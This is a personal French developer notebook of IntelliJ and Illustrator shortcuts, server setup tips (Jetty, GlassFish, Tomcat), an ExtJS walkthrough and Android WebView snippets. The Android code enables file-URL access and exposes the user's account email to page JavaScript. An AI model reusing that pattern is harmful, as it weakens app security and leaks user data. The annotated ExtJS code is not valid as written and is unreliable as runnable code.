          fermer les traces : sans lacher : maj ou ctrl ou alt? sais plus...
      selection ancrages : ctrl+a
      selection globale fleche noire : ctrl+b?
      afficher masquer poignees :  Ctrl/H ou bien Maj/Ctrl/B 
      selection suppression point encrage ctrl+-
  instancier poignees sur un point d'ancrage qui n'en a pas : 
      sur le point d'ancrage : alt+glisser
  pour supprimer une poignee:
    avec la fleche blanche la deplacer sur son pt d'ancrage      
  pathfinder  
      pour combiner deux traces: soustraire l'un à l'autre, ou les combiner ensemble ( mais en fait il cree des groupes : ca reste editable) si on veut tout applatir cliquer sur decomposer
      diviser pour decouper en plusieurs et mettre le tout dans un groupe
  grouper/degrouper dissocier 
      ctlr+g ctlr+maj+g


  
intelliji : intellij : Afaire: utiliser le git et l'apprendre.(dixit christophe)
shortcut pour deplacer le splitpannel du projet: Ctrl+Shift+fleches droite et gauche 
si j'ai unexpected end of file: c parce que j'ai des retours chario crlf au lieu de lf: faire file > line separator
Changer la couleur des instances selectionnées: settings-> chercher "identifier under caret" // j'ai du faire ça car le bleu de fond était trop pale et non visible
pour voir les dependances depandenc dependency dependencies le diagrame c pourri et en plus c'est que sur ultimate. mieux vaut faire Analyze>Analyze Dependencies....
pour voir les stats (nombre de lignes de code etc...) charger le plugin de statistiques https://plugins.jetbrains.com/plugin/4509-statistic : on voit tout en bas une nouvelle icone pour les afficher   
creer un bookmark flag tag ctrl+f11. Acceder à ce bookmark trouver : ctrl+chiffredubookmark. Ensuite editer la note du bookmark :shift+f11 puis Ctrl+entree sur le bookmark  
supprimer les bookmarks: shift+f11 (j'ai le choix)
si erreur Error connecting to 127.0.0.1:51924; reason: Error:failed to create a child event loop
    redémarrer pc
Piege: pour ajouter des jars dans le classpath: il ne faut pas ajouter les repertoires directories directorys contenant les jars mais directement les jars
creer la super classe qui extends etend ma classe actuelle pour remonter des methodes à un niveau plus haut parent 
      sur la classe actuelle: click droit >refactor>extract>superclass...
                            ou click droit > refactor>pullUp
fermer fichier en cours Ctrl+F4
fermer tous les fichiers sauf l'actuel close : close all closeall
        windows > editortab >close... 
debugger debuger tomcat avec intellij : 
    intellij>run>>editConfiguration>remote>+>debug start (copier la ligne en tête et la mettre dans les parametres de demarrage de tomcat:(-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005) demarrer le tomcat puis demarrer ce remotedebug (quand je veux c de la balle!)
nettoyer netoyer clean supprimer les methodes inutilisees non utilisees unused d'une classe ou de tout le projet
  menu analyze> inspectCode      
curseur multiple: 
  selectionner le truc qui se repeter puis ctrl+shift+alt+j (choisir vraiment le truc distingué pour ne pas avoir a désélectionner certain avec la souris)
  pour decompiler (download sources... ne decompile pas...) 
      utiliser le plugin de fernflower: desactiver les autres plugins pour que ça marche. Limite en installer un autre et le desactiver pour le reveiller.
si j'ai message
    Error:java: Annotation processing is not supported for module cycles. Please ensure that all modules from cycle are excluded from annotation processing
    c'est parce que j'ai des dependances cycliques dans mon pom: deux modules dépendant l'un de l'autre. Ou bien un module dépend de lui meme?
formatter forme affichier le xml : 
    code->reformat
pour paster un ancien paste du clipboard clip board collé: 
        Ctrl+Shift+Insert
tapper saisir abrege abregé racourci shortcut pour ecrire methode main : psvm
Si intellij ne demarre plus a cause d'une erreur initializ initialis fatal xdebug supprimer son cache: reset marche plus. Ou si intellij me cache des fichiers meme si dans projet>rouecrantee je coche quil doit tout afficher 
  supprimer repertoire D:\Profiles\lduverge\.IdeaIC2017.3 ou .idea
installer un plugin: pluggin :
    settings > plugin > on peut installer un jar.
indentation indenter format code : Ctrl+Alt+L
reculer l'indentation: voir colonne editing 
position des accolades a la ligne code format
        File>Settings>projectSettings>codeStyle-java >Wrapping and braces > Braces placement options > Next Line
pour faire un jar directement sans passer par maven: 
  file>projectStructure>Artifacts>ajouter jar (ne pas choisir "empty") et parametrer. Pour le builder: Build> BuildArtifact
voir les logs git vcs : alt+9
svn disconnect : installer le plugin pour ça.
      menu VCS>SvnDisconnect
      GIT est pourri sur intellij. Utiliser tortoise LINKtortoiseGItsdflk
git pull tous les projets/modules en une seule fois VCS>Update projects... // il ne fait que fetch. Penser à cliquer ensuite dans l'onglet VCS du bas pour voir ce qui se passe sinon suis aveugle. Il faudra faire pull après!(voir les fichiers D://git/pull.xls et D://git/pull.bat). 
si j'ai erreur source release 1.7 requires target release 1.7
          mettre pareil dans settings>build,execution,depl>compiler>javacompiler; projectstructure>project; projectstructure>modules>sources; dans le pom maven;
svn: >VCS>BrowseVCSRepository>BrowseSubersionRepository:
     >VCS>enable version control integration, choisir svn, j'ai du decocher "use command line client" pour me connecter au reseau hr
si je n'arrive pas à cloner un projet git directement avec intellij (a cause erreur password) : cmd windows, me placer dans le bon repertoire, faire un git clone. Revenir sur intellij>settings>VersionControl>ajouter (+) le path du projet dans la liste.           
      pour commiter un nouveau projet : VCS > Import into VersionControl > share project into subversion...>Atention, là je peux choisir le repository mais si je ne fais que ça il va copier les sous repertoires de mon projet donc il faut appyer sur + et mettre le repository+/RepertoireDuProjet (meme si il fait une erreur rouge continuer comme ça)
rafraichir refresh librairies gradle double cliquer sur build.gradle ou
      dans build.gradle ecrire : apply plugin: 'idea' And then run: gradle idea If you modify the dependencies you will need to rerun the above again.
si vue project projet ne se rafraichit pas refresh pas
    redemarrer intellij
gradle: pour tout builder: 
    view > gradle > projet > tasks >build > assemble
      ca build sous \projet\build\libs\springboot-deployment-1.0.0-SNAPSHOT.jar 
taille des logs dans la console: settings>console>overrideconsolebuffersize
pom voir arbre des dependances hierarchie > dans la vue maven: clique droit sur projet > show effective pom ATTENTION A RAFRAICHIR refresh dans vue maven sinon la hierarchie est obsolete
        encore mieux: charger https://plugins.jetbrains.com/plugin/7179-maven-helper et installer le plugin
        permet aussi d'afficher menu contextuel maven run debug dans projets projectst (si inactif  appuyer sur "+" a droite pannel maven)
        dans onglet dependency analyser à gauche on y voit les artifactID:version
si le pom.xml maven est en erreur: rafraichir refresh dans la vue maven +  faire une mvn:compilation pour le forcer à charger les dependances et montrer les vraies erreurs
gradle: creer si j'ai Could not find GradleWrapperMain il faut creer projet\gradle\wrapper\gradle-wrapper.jar
      ouvrir view gradle > a cote de run ouvrir editconfiguration > ajouter un conf gradle avec la Task:createWrapper executer ça.
Error:Unable to make the module: config-server_main, related gradle configuration was not found. Please, re-import the Gradle project and try again.
      ouvrir view gradle > rafraichir
convertir le projet en projet maven:
    click droit sur mon pom -> add module maven ou un truc comme ça      
ajouter un module equivaut a importer un projet dans le worskpace: module intellij : project structure> "+" importer > choisir Maven ou Gradle sinon pas bon si je choisis "from existing sources" à priori
  main/java=source
  test>java = test
voir les windows cote a cote split au millieu comparer comparaison
      clique droit sur tab de editeur > split vertically horizontally        
trouver tous les todos : alt+6 . pour voir les fixme faire settings>todos>Filter> rajouter fixme
buildpath du projet : file>project structure
show outline structure : alt+7 ou Ctrl+F12
les elements d'une classe ou outline: Ctrl+F12
deplacer : se mettre sur la ligne à deplacer, ctrl+shift+fleches haut/bas
changer les occurences plusieurs de nom : shift+F6
changer les occurences de type de variable ctrl+shift+F6 mais à la fin ne pas faire entree je crois sinon il bidouille. Faire escape
bouger une variable en variable declaree plus haut move deplacer selectionner variable puis Ctrl+alt+v(variable)ou ou m(methode) c(constante) ou f(champ field) LE FAIRE 2 FOIS pour plus d'otions :-) SI marche pas: passer la methode en statique > selectionner>click droit Refactore >Move. la remettre en non static et corriger les erreurs. Sert aussi à creer une classe depuis une embeded class embedded inner class
bouger une classe dans un autre package: dans package explorer faire ctrl+x puis ctrl+v(couper-coller)
bouger un bloc : selectionner puis ctrl+shift+fleches
supprimer ligne: Shift+suppr ou Ctrl+y
editer raccourcis shortcuts: key file>settings>keymap>Default> Editor Actions
si les shortcuts ne marchent plus faire peut etre controle + alt + fleches pave numerique peut etre que ça debloque (j'ai reussi une fois mais sais pas trop comment)
column colonne editing: plusieurs lignes multiples en meme temps:  alt+maj+insert
atteindre acceder accolade correspondante matching : Ctrl+Maj+M ou Ctrl+: (ce dernier c'est moi quil l'ai parametre)
importer/nettoyer les imports les packages automatiquement Ctrl+Alt+O
undo : ctrl + z 
redu ctrl+shift+z
evaluate selection  Alt+F8
retour back precedente edition pannel panel curseur revenir : ctrl+tab+ fleches ou Ctrl + alt + fleches ou Ctrl + e ou bien ça? ctrl+sift+delete
close tab : Ctrl+F4
make recompiler projet : Ctrl+F9 eventuellement recharger dependances maven: clique droit sur pom.xml >maven>reimport
    si maven deconne trop toujours settings>maven>importing> decocher import maven automatically; si ça ne suffit pas: supprimer via explorateur windows tous les .iml et .idea et recréer le projet intellij from scrach
les cases à cocher profile de la view maven ne servent à rien on dirait. qu'à montrer les profils dispos.
parcourir tabs de la vue view active : alt right et alt left
atteindre la ligne : Ctrl+g
Toute commande : Ctrl+Shift+A exemple: modifier taille buffer terminal  tapper:"Reg" chercher "terminal" modifier la taille du buffer
project properties proprietes : choisir projet dans la vue projet puis F4
renommer rename un projet:
  File>ProjectStructure>project>name
   ou 
    fermer Intellij; 
    changer le nom de tous les fichiers  *.ipr, *.iml, *.iws;
    ouvrir intellij;
trouver une classe meme dans les dependances et jars : Ctrl+n
replace remplacer : Ctrl+r puis alt+e pour y le faire
remplacer partout: Ctrl+shift+r
hierarchie herite parent voir heritage : Ctrl+h
voir hierarchie remonter methode parente sur methode faire Ctrl+u
gotoline Ctrl+g
methode fonction prochaine precedente suivante debut fin methode: alt+haut / alt+bas
ctrl+maj+F10: executer run la ou je suis où est le focus
run rerun redemarrer reexecuter: maj+F10(optionnel: dans VM options mettre les -Detcetcetc=etcetc -D...)
tester tous les tests: Ctrl+shift+R
tester avec couverture coverage: clique droit run xxx with coverage (permet de trouver le code mort :-) si j'ai une couverture à 100%)
redebug redebugger: Ctrl+F5 ou maj+F9
    F7 pour rentrer F8 pour next step pas ligne F9 pour poursuivre. Pour sortir : sift+F8
  pour recompiler à chaud la classe en cours de debuggage : Ctrl+MAJ+F9
  pour recompiler tout à chaud : RUN> ReloadChangedClasses
pour debugger debuger à distance: intellij>run>>editConfiguration>remote>+>debug start 
debuggage pour voir le stacktrace appuyer sur icone rouage>restore view je crois 
stop interrompre arrater Ctrl+F2 (on peut y aller meme si ya plusieurs tabs il va nous dire lequel on veut stopper)
show in package explorer : Alt+F1
show loggcat android alt+6
show console alt+4
show/unshow console terminal alt+F12 (c'est plus rapide que de faire ctrl+tab)
corriger quick fix : alt+enter
voir la console du run: alt+4
pour modifier un type de fichier source : en faire un source, un repertoire de tests etc... Ctrl+Shift+Alt+s, choisir à gauche le projet, à droite le repertoire et clique droit dessus 
erreur error details probleme explication Ctrl+F1
search trouver rechercher partout Ctrl+shift+f // si ne marche plus bien, supprimer arreter intellij, supprimer .idea et redemarrer
recherche trouver search partout: maj maj
parcourir atteindre erreurs problems F2/Maj+F2
trouver les recurences, qui utilise reference les appelants dependance : Alt+F7 peut aussi servir à epingler un pannel
pin epingler un tab un pannel pin j'ai rajouté le raccourci alt+$                                                                                                       
ouvrir fichier recent : Ctrl+E / Ctrl+shift+E
deploie plie fold reduire unfold code bloc (se mettre bien à l'interieur du bloc) Ctrl+Plus/Minus et pour le faire de facon recursif pour tous: Ctrl+shift+Plus/minus
atteindre definition declaration methode Ctrl+b
aide detail help info afficher doc : dans une parenthese de methode: Ctrl+P; quelquepart: Ctrl+Q doc: pour installer la doc si elle n'existe pas télécharger le zip sous http://www.oracle.com/technetwork/java/javase/downloads/jdk10-doc-downloads-4417029.html le poser qqpart puis intellij>projectstructure>sdk>onglet documentationpath>+> chemin vers .zip direct.
prochaines occurences Ctrl+F3
atteindre declaration variable? Ctrl+B
afficher voir parcourir liste les elements fonctions methodes d'une classe: Ctrl+F12
mettre un breakpoint placer un point d'arret ctrl+F8
enable disable breakpoint: CTRL + SHIFT + F8 puis alt+d
afficher tous les breakpoints : Ctrl+Shift+F8
parcourir les erreurs : F2 / shift+F2
trouver rechercher un fichier par son nom name Ctrl + n(classe) ctrl + shift + n : fichier
pour faire une trouver recherche dans les projets: focusser sur le projet et commencer à saisir les caractères
renommer refractor rename Maj+F6: a la fin faire echape!!!
renommer Maj+F6
bouger move un truc F6 essayer aussi ctrl+alt+v(jamais essayé)
overide override: Ctrl+O
implementer methode : Ctrl+I 
Fermer tab shift+click
Generer constructor constructeur getter geter seter setter etc : Alt+Insert
Changer de vue Alt+F1
focus vers Editor: Echap et F12: focus precedent
focus precedent : alt+ctrl+fleches
fullscreen agrandire aggrandire plain ecrant full size Maximise editor Ctrl+Shift+F12
creer surround suround trycatch Selectionner puis Ctrl+Alt+T
creer surround suround synchronizd syncronized Selectionner puis Ctrl+Alt+T
autocompletion Alt+Maj+Espace ou Ctrl+Espace
fille fils methode sous classe: Ctrl+Alt+B
Acceder à la methode de la sous classe implementant l'interface : Ctrl+b
generer la methode d'une sous classe dans l'interface : ajouter @Override et faire alt+entree sur l'erreur affichee > pull upSelectionner de plus en plus Ctrl+w
commenter/decommenter Ctrl+barre oblique Ctrl+maj+barre oblique DU NUMPAD!

eventsource :sse(server-sent-event) autre alternative aux websocket mais ca ne fonctionne que dans un sens : serveur->client: rafraichit en live la page dans une seule requete
    voir https://github.com/mdn/dom-examples/blob/master/server-sent-events/sse.php
    et voir coté javascript sur MDN: EventSource 
jwebsocket : (Web Socket) faire un chat : 
  declarer  JWEBSOCKET_HOME vers D:\LocalData\p036782\jWebSocket-1.0
  en variable d'environnement
   D:\LocalData\p036782\jWebSocket-1.0\bin\jWebSocketAdmin.bat
   D:\LocalData\p036782\jWebSocket-1.0\bin\jWebSocketServer.bat
   ou 
   java -jar jWebSocketServer-1.0.jar
convettir les AMR en MP3
  amr to mp3 converter
Audacity:
  placer lame.dll au meme niveau que audacity.exe
  si imposssible exporter fichier : 
      Fichier > editer metadata > effacer

OCR : image to texte :
  http://www.onlineocr.net/support/AboutOnlineOCR.aspx
  il accepte les gros jpeg 12qualite <4.1Mo


glassfish :
    C:\glassfish3\glassfish\bin>asadmin start-domain
    C:\glassfish3\glassfish\bin>asadmin stop-domain
  localhost:8080 puis localhost:4848
  http://localhost:2097/common/index.jsf
  

extjs :
sdk :
    C:\Program Files\SenchaSDKTools-2.0.0-beta3>sencha
    pour creer une appli:
        sencha app create decOclap C:\wamp\www\kanail\decOclap // pfff le sdk ne marche pas

organisation sous WEB-INF :
  - appname
    - app // voir  appFolder: 'app' de Ext.application
        - controller   // ecoute les evennements qui ont lieu dans les vues et execute une logique
            - Class1.js
            - Class2.js
            - ...
        - model
            - Class3.js
            - Class4.js
            - ...
        - store
            - Class3.js
            - Class4.js
            - ...
        - view    // UI
              - user
                  - List.js
                  - Class4.js
                  - ...
                  - Viewport.js                                      
    - data
        - data1.json
        - data2.json                       
    - extjs
    - resources
        - css
        - images
        - ...
    - app.js
    - index.html
              c ca : 
              <html>
                  <head>
                      <title>Hello Ext</title>
                       <META http-equiv="Content-Type" content="text/html; charset=ISO-8859-15" />
                      <link rel="stylesheet" type="text/css" href="extjs/resources/css/ext-all.css">
                      <!-- pour le dev -->
                      <script type="text/javascript" src="extjs/ext-debug.js"></script>
                      <script type="text/javascript" src="app.js"></script>
                      <!-- pour la prod -->
                          <script type="text/javascript" src="extjs/ext.js"></script>
                          <script type="text/javascript" src="app-all.js"></script>
                  </head>
                  <body></body>
                  </html>
  app.js contient :
Ext.onReady(function() { (methode appelee quand dom charge)
      Ext.require('Ext.container.Viewport'); // appelle de la librairie Viewport avant l'affichage initial. (evite les latences pour plus tard)
        Ext.application({
          name: 'HelloExt', // nom de mon projet devient une variable globale pour toute mon appli
          appFolder: 'app', // determine le path de mes classes (voir ci dessus)
          controllers: [     // ca lance la methode init de mes controllers juste avant la methode launch ci-dessous       
                            'Users' // si rien ne s'affiche, verifier que ce nom = nom de mon fichier controller
                              ...
                       ],
          launch: function() { // au demarrage
              Ext.create('Ext.container.Viewport', {
                  layout: 'fit',
                  items: [
                      {
                          title: 'Hello Ext',
                          html: 'Hello! Welcome to Ext JS.'
                      },
                      {xtype: 'userlist'} // appelle la vue dont le xtype c'est userlist
                  ]
              });
          }
      });
      // pour creer une vue de type grid :
                          Ext.define('decOclap.view.user.List' ,{  // chemin de ma class
                          extend: 'Ext.grid.Panel',
                          alias : 'widget.userlist',   // son xtype
                      
                          title : 'All Users',
                      
                          initComponent: function() {
                              this.store = {
                                  fields: ['name', 'email'],
                                  data  : [
                                      {name: 'Ed',    email: 'ed@sencha.com'},
                                      {name: 'Tommy', email: 'tommy@sencha.com'}
                                  ]
                              };
                      
                              this.columns = [
                                  {header: 'Name',  dataIndex: 'name',  flex: 1},
                                  {header: 'Email', dataIndex: 'email', flex: 1}
                              ];
                      
                              this.callParent(arguments);
                          }
                      });
      // pour creer une classe:
      Ext.define('My.sample.MaClassPerson', {
                                                  // mettre ca si c un controller
                                                  extend: 'Ext.app.Controller',
                                                       views: [ // declarer mes vues ici. (path)
                                                                  'user.List'
                                                              ],
                                                  init: function() 
                                                  {
                                                          console.log('Initialized Users! This happens before the Application launch function is called');
                                                          // tous les eventListeners de ma vue sont ici:
                                                           this.control({
                                                                          'viewport > panel': //document.querySelector dont le nom est les classes sans majusc ou un xtype
                                                                          {
                                                                              render: this.uneMethode // appelle une methode de mon controlleur
                                                                              ou
                                                                              itemdblclick: this.uneAutreMethode // itemdblclick double clic sur un item
                                                                          }
                                                                      });
                                                  }
                                                  //FIN mettre ca si c un controller
                                              /** @readonly */
                                              name: 'Unknown',
                                              statics: // contient les objets statics que dans la classe statique!! 
                                              {
                                                    instanceCount: 0,
                                                    factory: function(brand) // on fera appel à cette methode comme ca :var dellComputer = My.sample.MaClassPerson.factory('Dell'); 
                                                    {
                                                        // 'this' in static methods refer to the class itself
                                                        return new this({brand: brand});
                                                    }
                                                },
    
                                                config: {
                                                    title: 'Title Here', // va automatiquement avoir une methode getter et setter car dans config
                                            
                                                    bottomBar: {          // va automatiquement avoir une methode getter et setter car dans config
                                                        enabled: true,
                                                        height: 50,
                                                        resizable: false
                                                    }
                                                },
      
                                                applyTitle: function(title) { // cette fonction sera toujours appellee automatiquement avant de setter la value settable title
                                                    (... on peut faire des tests sur la valeur title et faire une alerte et rien renvoyer si on invalide la valeur de title ...)
                                                    if (bottomBar && bottomBar.enabled) // autre exemple si on etait dans la methode applyBottomBar 
                                                    {
                                                        if (!this.bottomBar) {
                                                            return Ext.create('My.own.WindowBottomBar', bottomBar); // instancie la classe
                                                        }
                                                        else {
                                                            this.bottomBar.setConfig(bottomBar);
                                                        }
                                                    }
                                                        // sin on valide on renvoit un truc :
                                                        return title;
                                                    }
                                                },
                                                                                    
                                              constructor: function(name) 
                                              {
                                                   if (name) 
                                                   {
                                                        this.name = name;
                                                   }
                                                   return this;
                                              },
                                              constructor: function(config) {
                                                    this.initConfig(config); // appelle la methode config ci dessus
                                                    return this;
                                                },
                                              eat: function(foodType) 
                                            {
                                                  alert(this.name + " is eating: " + foodType);
                                                  return this;
                                            }
                                          }
              );
    // pour instancier une classe :
    var aaron = Ext.create('My.sample.MaClassPerson', 'Aaron');  // ou var myWindow = Ext.create('My.own.Window', 
                                                                                                                    {
                                                                                                                        title: 'Hello World',
                                                                                                                        bottomBar: {
                                                                                                                            height: 60
                                                                                                                        }
                                                                                                                    }); 
    aaron.eat("Salad"); // alert("Aaron is eating: Salad");
    alert(myWindow.getTitle()); // alerts "Hello World"
    myWindow.setTitle('Something New');
    alert(myWindow.getTitle()); // alerts "Something New"
    myWindow.setTitle(null); // alerts "Error: Title must be a valid non-empty string"
    myWindow.setBottomBar({ height: 100 }); // Bottom bar's height is changed to 100
pour logger les erreurs :
      throw new Error('['+ Ext.getDisplayName(arguments.callee) +'] Some message here'); // va faire un bon stacktrace      

jetty :avec maven: 
      besoin recup bonne version jetty sur http://central.maven.org/maven2/org/eclipse/jetty/jetty-maven-plugin/9.2.1.v20140609/ (mettre version 9...etc dans le pom)
      %M3%/mvn jetty:run-war -Denv=dev /// ne pas utiliser ca: %M3%/mvn jetty:run car avec datanucleus ca marche mieux de toujours deployer un war plutot que d'executer dans le target       
      voir la bonne doc : http://www.eclipse.org/jetty/documentation/current/jetty-maven-plugin.html        
  cd /opt/jetty
  (les webapps sont sous /opt/jetty/webapps)
  demarrer :
        invoke-rc.d jetty start ou stop (sous etc/init.d)
        /usr/local/java/bin/java -jar start.jar > server.log (si on veut logger)
        http://95.142.162.203:8080/SamiCours-1.0/SamiCours.html
        si il ne trouve pas une servlet dans web.xml inverser l'ordre des balises servlet-mapping et servlet
   redemarrer :
       /etc/init.d/jetty restart
       si erreur jndi faire echo $PATH et y rajouter le chemin vers java c a d :
       export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/java/bin
  je peux verifier mes parmetres de demarage de jetty en tappant : 
      service jetty check       
  securite:
      modifier fichier webdefault.xml voir jetty-testrealm.xml et realm.properties puis  
      <Set name="defaultsDescriptor"><SystemProperty name="jetty.home" default="."/>/etc/webdefault.xml</Set>       
tomcat :
      GRAVE: The web application [/hr-ws] registered the JDBC driver [org.hsqldb.jdbc.JDBCDriver] but failed to unregister it when the web application was stopped. To prevent a memory leak, the JDBC      
      GRAVE: The web application [/hr-dms] created a ThreadLocal with key of type [java.lang.ThreadLocal] (value [java.lang.ThreadLocal@3c077ab4]) and a value of type [com.hraccess.portal.accessibility.AccessibilityMode] (value [STANDARD]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.
    
    
was : 
si j'ai une erreur: corba blabla port xxx deja utilise: faire un 
 netstat -an(p pour voir les idprocess) ou netstat -b etc pour voir par quoi est utilise le port et arreter le programme en question (sur windows ou unix cette commande fonctionne)
 
Android :
driver usb samsung mobile : il ne detecte pas mon telephone 
    si googleUSBdriver n'est pas suffisant installer
    http://download.clockworkmod.com/test/UniversalAdbDriverSetup6.msi et la ca marche
changer la couleur native du fond : 
  main/res/values/colors.xml
si j'arrive pas à debugger debuger
    Settings>usb>tethering
faire un lien pour composer numero : <a href="tel:2125551212">2125551212</a>
Gradle sync failed: Plugin is too old, please update to a more recent version, or set ANDROID_DAILY_OVERRIDE environment variable to ... Consult IDE log for more details (Help | Show Log)
    file>projet settings > modifier version plugin gradle

    pour pouvoir utiliser cssRules du webkit
        wv= allowJsAccessLocalCss(wv); où
                  @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
                    public WebView allowJsAccessLocalCss(WebView bwv)
                	{
                				bwv.getSettings().setAllowFileAccessFromFileURLs(true); //-allow-file-access-from-files
                				return bwv;
                	}
recuperer le mail de l'utilisateur
      @JavascriptInterface
    public String getEmailAccount()
    {
        String ret ="";
        Account[] accounts = AccountManager.get(this).getAccounts();
        Pattern mailPattern = Patterns.EMAIL_ADDRESS;
        for (Account account : accounts) {
            if (mailPattern.matcher(account.name).matches()) {
                ret = account.name;
            }
        }
        return ret;
    }
 si je fais en html: mettre ca absolument : <meta name="viewport" content="width=device-width, initial-scale=1.0"> : pour eviter le zoom automatique
pour que quand on clique sur un bouton il ne devienne pas orange : 
      *{
      -webkit-tap-highlight-color: rgba(0, 0, 0, 0); 
      }
pour que tout le texte de la page soit editable (j'utilise pas)
    *{
      -webkit-user-modify: read-write-plaintext-only; 
      }
si j'ai le message Failed to create BuildConfig class
    demarrer eclipse en mode admin
sauver une image en bitmap suite à avoir choisi dans la gallerie :
    suite à : protected void onActivityResult(int requestCode, int resultCode, Intent data) {
	   qui appelle alors saveBitmap:
    public void saveBitmap(Intent data)
    	{
    		try {
    		 Uri selectedImage = data.getData();
    		 String[] filePathColumn = { MediaStore.Images.Media.DATA };
    		 Cursor cursor = this.getContentResolver().query(selectedImage,filePathColumn, null, null, null);
    		 cursor.moveToFirst(); 
    		 int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
    		 String picturePath = cursor.getString(columnIndex);
    		 cursor.close();
    		 File f = new File(DESTINATION);
    		 FileOutputStream outputFile;
    		outputFile = new FileOutputStream(f);
    		 BitmapFactory.decodeFile(picturePath).compress(Bitmap.CompressFormat.JPEG, 90, outputFile);
    		} catch (FileNotFoundException e) {
    			// TODO Auto-generated catch block
    			e.printStackTrace();
    		}
    	} 

  canvas :
      canvas.drawBitmap(monBitmap, Le rectangle qui croop le bitmap, le rectangle positionne dans le canvas(du coup possible faire un zoom sur mon bitmap par ex));
faire des boutons interrupteurs : 
	private ToggleButton autoRepet;
	        autoRepet.setBackgroundDrawable(auto);
	        // pour ne pas que les boutons aient du texte:
        	autoRepet.setText(null);
        	autoRepet.setTextOn(null);
        	autoRepet.setTextOff(null);
	        
    autoRepet.setOnCheckedChangeListener(new OnCheckedChangeListener() 
										    {
												public void onCheckedChanged(CompoundButton buttonView,boolean isChecked) 
												{
													ToggleButton toggleButtonView = (ToggleButton)buttonView;
													if (isChecked) {
														toggleButtonView.setText("appuye");
										                
														toggleButtonView.setBackgroundDrawable(auto_org);
										            (...)
										            } else {
										            	toggleButtonView.setText("relache");
										            	toggleButtonView.setBackgroundDrawable(auto);
                                (...)
										            	
										            }
												}
										    }
    		);

faire une dialog box :
			AlertDialog.Builder builder = new AlertDialog.Builder(this);
			builder.setMessage("Supprimer?");
			builder.setPositiveButton("Oui", dialogClickListener);
			builder.setNegativeButton("Non", dialogClickListener);
			builder.show();
    DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
    	    @Override
    	    public void onClick(DialogInterface dialog, int which) {
    	        switch (which){ voir LINKswcthfdf
    	        case DialogInterface.BUTTON_POSITIVE:
    	          confirmDeleteImage();  //Yes button clicked
    	            break;
    
    	        case DialogInterface.BUTTON_NEGATIVE:
    	            //No button clicked
    	            break;
    	        }
    	    }
    	};

si eclipse ne reconnait pas mon tel: unknown : 
  taskmanager: arreter adb.exe sinon redemarrer le tel
si erreur Installation error: INSTALL_FAILED_INSUFFICIENT_STORAGE
    liberer espace memoire pas sur carte sd mais sur telephone même
filtrer les logs par pid:
  pid:6541
si j'ai message: 
  Davilk format with error 1 
    faire un clean du projet
versions:
    4.4.x	KitKat 19
    4.2.x	Jelly Bean	November 13, 2012	18	1.4%
    4.2.x	Jelly Bean	November 13, 2012	17	1.4%
    4.1.x	Jelly Bean	July 9, 2012	16	12.2%
    4.0.x	Ice Cream Sandwich	December 16, 2011	15	29.0%
    3.2	Honeycomb	July 15, 2011	13	1.0%
    3.1	Honeycomb	May 10, 2011	12	0.3%
    2.3.3–2.3.7	Gingerbread	February 9, 2011	10	45.4%--->Mon HTC Desire
    2.3–2.3.2	Gingerbread	December 6, 2010	9	0.2%--->Memoclap commence là (HTML5 supporte)
    2.2	Froyo	May 20, 2010	8	8.1%
    2.0–2.1	Eclair	October 26, 2009	7	2.2%
    1.6	Donut	September 15, 2009	4	0.2%
pour envoyer un message popup :
          Toast toast = Toast.makeText(context, text, duration);
      		toast.show();
pour faire un menu quand on clique sur le bouton menu :
    @Override
    	public boolean onCreateOptionsMenu(Menu menu) {
    		// Inflate the menu; this adds items to the action bar if it is present.
    		//getMenuInflater().inflate(R.menu.activity_memoclap, menu);
    		menu.add(menu.NONE,menu.FIRST,menu.NONE, "Exit");
    		menu.add(menu.NONE,2,menu.NONE, "Effacer donnees");
    		return (super.onCreateOptionsMenu(menu));
    	}
    	
    	@Override
    	public boolean onOptionsItemSelected(MenuItem item) {
    		switch (item.getItemId()) voir LINKswcthfdf 
      		{ 
      		case 1: this.finish(); break;// quitter
      		case 2: this.fileStorageClear(); break;
      		}
    		return super.onOptionsItemSelected(item);
    	}
    
pour empecher le redemarrage activite quand ouverture clavier ou rotation ecran : 
      dans manifest: 
    <activity....android:configChanges="keyboard|keyboardHidden|orientation">
pour savoir si on est en ligne internet:
      public boolean isOnline() {
          ConnectivityManager cm =
              (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
          NetworkInfo netInfo = cm.getActiveNetworkInfo();
          if (netInfo != null && netInfo.isConnectedOrConnecting()) {
              return true;
          }
          return false;
      }
      <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
pour lancer le webkit :
      protected void onCreate(Bundle savedInstanceState) {
      		super.onCreate(savedInstanceState);
      	//	setContentView(R.layout.activity_memoclap);
      		  wv = getBootstrapView();
      	        setContentView(wv);
      		wv.loadUrl("file:///android_asset/index.html");		
      		 wv.addJavascriptInterface(this, "jInterface"); // attention besoin depuis api17 mettre     @JavascriptInterface en tete de chaque methode que je veux faire communiquer avec javascript
      	} 
      	public WebView getBootstrapView() 
    	{
			WebView bwv=new WebView(this);
			bwv.getSettings().setJavaScriptEnabled(true);
			setMediaPlayback(bwv); // sur certains telephones pour autoriser le demarrage de la lecture
			//wv.getSettings().setUseDesktopUserAgent(true);
			//bwv.getSettings().setDatabaseEnabled(true);
			bwv.getSettings().setDomStorageEnabled(true); // pour enabler localstorage 1
			bwv.getSettings().setDatabasePath("/data/data/"+Memoclap.class.getPackage().getName()+"/databases/");// pour enabler localstorage 2
			bwv.getSettings().setLoadsImagesAutomatically(true);
			//enable javascript alerts :
				bwv.setWebChromeClient(new WebChromeClient() 
				{
					public boolean onJSAlert(WebView view, String url, String message, JsResult result)
					{
						return true;
					}
				});
			return bwv; 
	}
ou
			//enable javascript alerts :
				bwv.setWebChromeClient(new WebChromeClient() 
				{
					public boolean onJsAlert(WebView view, String url, String message, final android.webkit.JsResult result)
        {
            new AlertDialog.Builder(myApp)                                                   // facultatif
                    .setTitle("YOUMOUVE") // comme ca le titre de mes alerts est personnalise
                    .setMessage(message)
                    .setPositiveButton(android.R.string.ok,
                            new AlertDialog.OnClickListener()
                            {
                                public void onClick(DialogInterface dialog, int wicht)
                                {
                                    result.confirm();
                                }
                            }).setCancelable(false)
                    .create()
                    .show();                                                            //finfacultatif
            return true;                                                               // obligatoire
        }
				});
			return bwv; 
	}
